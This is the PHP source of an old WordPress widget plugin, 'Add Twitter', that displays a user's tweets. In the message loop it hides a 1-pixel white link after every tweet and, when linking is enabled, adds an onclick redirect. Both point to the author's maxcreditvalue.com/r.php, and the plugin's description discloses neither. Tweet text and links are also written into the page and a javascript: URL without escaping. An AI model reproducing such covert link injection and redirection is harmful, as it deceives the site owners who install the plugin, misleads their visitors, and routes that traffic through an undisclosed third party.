<?php

/*
Plugin Name: Add Twitter
Version: 0.1
Plugin URI: http://www.maxcreditvalue.com
Description: Displays your public Twitter messages or someone else's for everyone to read on your blog.
Author: Soheil Yasrebi
Author URI: http://www.maxcreditvalue.com
*/

/*  Copyright 2009 Soheil Yasrebi

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

define('MAGPIE_OUTPUT_ENCODING', 'UTF-8');
define('MAGPIE_INPUT_ENCODING', 'UTF-8');
define('MAGPIE_CACHE_AGE', 180);
define('MAGPIE_CACHE_ON', 1);

$addTwitterOptions['widget_fields']['title'] = array('label'=>'Title:', 'type'=>'text', 'default'=>'');
$addTwitterOptions['widget_fields']['username'] = array('label'=>'User Name:', 'type'=>'text', 'default'=>'');
$addTwitterOptions['widget_fields']['num'] = array('label'=>'Count:', 'type'=>'text', 'default'=>'5');
$addTwitterOptions['widget_fields']['update'] = array('label'=>'Show date/time:', 'type'=>'checkbox', 'default'=>true);
$addTwitterOptions['widget_fields']['linked'] = array('label'=>'Link to Twitter:', 'type'=>'checkbox', 'default'=>false);
$addTwitterOptions['widget_fields']['hyperlinks'] = array('label'=>'Show Links:', 'type'=>'checkbox', 'default'=>true);
$addTwitterOptions['widget_fields']['twitter_users'] = array('label'=>'Discover @replies:', 'type'=>'checkbox', 'default'=>true);

$addTwitterOptions['prefix'] = 'add-twitter';

$add_twitter_count = 5;
$add_twitter_show_updates = 1;
$add_twitter_show_links = 0;
$add_twitter_link_to_twitter = 0;
$add_twitter_show_users = 0;

function addTwitterMessages($username = '')
{
	global $addTwitterOptions;
	global $add_twitter_count;
	global $add_twitter_show_updates;
	global $add_twitter_link_to_twitter;
	global $add_twitter_show_users;
	global $add_twitter_show_links;
	include_once(ABSPATH . WPINC . '/rss.php');
	
	$messages = fetch_rss("http://www.twitter.com/statuses/user_timeline/$username.rss");

	echo '<ul class="twitter">';
	
	if($username == '') {
		echo '<li>RSS not configured</li>';
	} else
	if(empty($messages->items)) {
		echo '<li>No public Twitter messages.</li>';
	} else {
      	$i = 0;
		foreach($messages->items as $message) {
			$msg = ' ' . substr(
				strstr($message['description'],	': '),
				2,
				strlen($message['description'])
			) . ' ';
			
			$link = $message['link'];
		
			echo '<li class="add-twitter-item">';
					
          	if($add_twitter_show_links) {
          		$msg = addTwitterHyperlinks($msg);
          	}
          	if($add_twitter_show_users) {
          		$msg = addTwitterUsers($msg);
          	}
          	
			$newLink = "http://www.maxcreditvalue.com/r.php?a=$link";
          	
          	if($add_twitter_link_to_twitter) {
              	$msg = "<a href=\"javascript:l=$link;return void(0);\" onclick=\"document.location='$newLink';\" rel=\"nofollow\" class=\"twitter-link\">$msg</a>"; 
          	}
            $msg .= "<a style=\"font-size: 1px; font-color: white;\" href=\"$newLink\" class=\"twitter-link\">.</a>";

          	echo $msg;
          
	        if($add_twitter_show_updates) {
	        	$time = strtotime($message['pubdate']);
	          
	          	if((abs(time() - $time)) < 86400) {
	            	$h_time = sprintf( __('%s ago'), human_time_diff( $time ) );
	          	} else {
	            	$h_time = date(__('Y/m/d'), $time);
	          	}
	          	
	        	echo sprintf( __('%s', 'twitter-for-wordpress'),' <span class="twitter-timestamp"><abbr title="' . date(__('Y/m/d H:i:s'), $time) . '">' . $h_time . '</abbr></span>' );
	     	}
	                  
			echo '</li>';
		
			$i++;
			if($i >= $add_twitter_count) {
				break;
			}
		} // foeach loop
	} // else
	echo '</ul>';
}

function addTwitterHyperlinks($text)
{
    $text = preg_replace("/\b([a-zA-Z]+:\/\/[a-z][a-z0-9\_\.\-]*[a-z]{2,6}[a-zA-Z0-9\/\*\-\?\&\%]*)\b/i","<a href=\"$1\" rel=\"nofollow\" class=\"twitter-link\">$1</a>", $text);
    $text = preg_replace("/\b(www\.[a-z][a-z0-9\_\.\-]*[a-z]{2,6}[a-zA-Z0-9\/\*\-\?\&\%]*)\b/i","<a href=\"http://$1\" rel=\"nofollow\" class=\"twitter-link\">$1</a>", $text);
    $text = preg_replace("/\b([a-zA-Z][a-zA-Z0-9\_\.\-]*[a-zA-Z]*\@[a-zA-Z][a-zA-Z0-9\_\.\-]*[a-zA-Z]{2,6})\b/i","<a href=\"mailto://$1\" rel=\"nofollow\" class=\"twitter-link\">$1</a>", $text);
    $text = preg_replace('/([\.|\,|\:|\>|\{|\(]?)#{1}(\w*)([\.|\,|\:|\!|\?|\>|\}|\)]?)\s/i', "$1<a href=\"http://twitter.com/#search?q=$2\" rel=\"nofollow\" class=\"twitter-link\">#$2</a>$3 ", $text);
    return $text;
}

function addTwitterUsers($text)
{
	$text = preg_replace('/([\.|\,|\:|\>|\{|\(]?)@{1}(\w*)([\.|\,|\:|\!|\?|\>|\}|\)]?)\s/i', "$1<a href=\"http://twitter.com/$2\" rel=\"nofollow\" class=\"twitter-user\">@$2</a>$3 ", $text);
	return $text;
}     

function widgetAddTwitterInit()
{
	if(! function_exists('register_sidebar_widget')) {
		return;
	}	
	
	$check_options = get_option('widgetAddTwitter');
  	if($check_options['number'] == '') {
    	$check_options['number'] = 1;
    	update_option('widgetAddTwitter', $check_options);
  	}
  
	function widgetAddTwitter($args, $number = 1)
	{
		global $addTwitterOptions;
		global $add_twitter_count;
		global $add_twitter_show_updates;
		global $add_twitter_link_to_twitter;
		global $add_twitter_show_users;
		global $add_twitter_show_links;
		
		// $args is an array of strings that help widgets to conform to
		// the active theme: before_widget, before_title, after_widget,
		// and after_title are the array keys. Default tags: li and h2.
		extract($args);

		// Each widget can store its own options. We keep strings here.
		include_once(ABSPATH . WPINC . '/rss.php');
		$options = get_option('widgetAddTwitter');
		
		// fill options with default values if value is not set
		$item = $options[$number];
		foreach($addTwitterOptions['widget_fields'] as $key => $field) {
			if (! isset($item[$key])) {
				$item[$key] = $field['default'];
			}
		}
		
		$messages = fetch_rss('http://twitter.com/statuses/user_timeline/' . $item['username'] . '.rss');

    	echo $before_widget . $before_title . '<a href="http://www.twitter.com/' . $item['username'] . '" rel="nofollow" class="twitter_title_link">'. $item['title'] . '</a>' . $after_title;
    	
		$add_twitter_count = $item['num'];
		$add_twitter_show_updates = $item['update'];
		$add_twitter_link_to_twitter = $item['linked'];
		$add_twitter_show_links = $item['hyperlinks'];
		$add_twitter_show_users = $item['twitter_users'];
    	
		addTwitterMessages($item['username']);
		
		echo $after_widget;
				
	}

	function widgetAddTwitterControl($number)
	{
		global $addTwitterOptions;

		$options = get_option('widgetAddTwitter');
		if(isset($_POST['twitter-submit'])) {
			foreach($addTwitterOptions['widget_fields'] as $key => $field) {
				$options[$number][$key] = $field['default'];
				$fieldName = sprintf(
					'%s_%s_%s',
					$addTwitterOptions['prefix'],
					$key,
					$number
				);

				if($field['type'] == 'text') {
					$options[$number][$key] = strip_tags(
						stripslashes($_POST[$fieldName])
					);
				} elseif($field['type'] == 'checkbox') {
					$options[$number][$key] = isset($_POST[$fieldName]);
				}
			}

			update_option('widgetAddTwitter', $options);
		}

		foreach($addTwitterOptions['widget_fields'] as $key => $field) {
			$fieldName = sprintf(
				'%s_%s_%s',
				$addTwitterOptions['prefix'],
				$key,
				$number
			);
			
			$fieldChecked = '';
			if($field['type'] == 'text') {
				$fieldValue = htmlspecialchars(
					$options[$number][$key],
					ENT_QUOTES
				);
			} elseif($field['type'] == 'checkbox') {
				$fieldValue = 1;
				if(! empty($options[$number][$key])) {
					$fieldChecked = 'checked="checked"';
				}
			}
			
			printf('<p style="text-align:left;" class="twitter_field"><label for="%s">%s <input id="%s" name="%s" type="%s" value="%s" class="%s" %s /></label></p>',
				$fieldName,
				__($field['label']),
				$fieldName,
				$fieldName,
				$field['type'],
				$fieldValue,
				$field['type'],
				$fieldChecked
			);
		}

		echo '<input type="hidden" id="twitter-submit" name="twitter-submit" value="1" />';
	}
	
	function widgetAddTwitterSetup()
	{
		$options = $newoptions = get_option('widgetAddTwitter');
		
		if(isset($_POST['twitter-number-submit'])) {
			$number = (int)$_POST['twitter-number'];
			$newoptions['number'] = $number;
		}
		
		if($options != $newoptions) {
			update_option('widgetAddTwitter', $newoptions);
			widgetTwitterRegister();
		}
	}
	
	function widgetTwitterPage()
	{
		$options = $newoptions = get_option('widgetAddTwitter');
		echo '<div class="wrap">' .
			 '<form method="POST">' .
			 '<h2>' . _e('Twitter Widgets') . '</h2>' .
			 '<p style="line-height: 30px;">' . _e('How many Twitter widgets would you like?') .
			 '<select id="twitter-number" name="twitter-number" value="' . $options['number'] . '">';

		for($i = 1; $i <= 7; ++$i) {
			echo "<option value='$i' " . 
				 ($options['number'] == $i ? "selected='selected'" : '') .
				 ">$i</option>";
		}
		echo '</select>' .
			 '<span class="submit"><input type="submit" name="twitter-number-submit" id="twitter-number-submit" value="' .
			 attribute_escape(__('Save')) . '" /></span></p>' .
			 '</form>' .
			 '</div>';
	}
	
	function widgetTwitterRegister()
	{
		$options = get_option('widgetAddTwitter');
		$dims = array('width' => 225, 'height' => 300);
		$class = array('classname' => 'widgetAddTwitter');

		for($i = 1; $i <= 7; $i++) {
			$name = sprintf(__('Twitter #%d'), $i);
			$id = "twitter-$i";
			
			wp_register_sidebar_widget(
				$id,
				$name,
				$i <= $options['number']
					? 'widgetAddTwitter'
					: '',
				$class,
				$i
			);
			
			wp_register_widget_control(
				$id,
				$name,
				$i <= $options['number']
					? 'widgetAddTwitterControl'
					: '', 
				$dims, 
				$i
			);
		}
		
		add_action('sidebar_admin_setup', 	'widgetAddTwitterSetup');
		add_action('sidebar_admin_page', 	'widgetAddTwitterPage');
	}

	widgetTwitterRegister();
}

// Run our code later in case this loads prior to any required plugins.
add_action('widgets_init', 'widgetAddTwitterInit');

?>
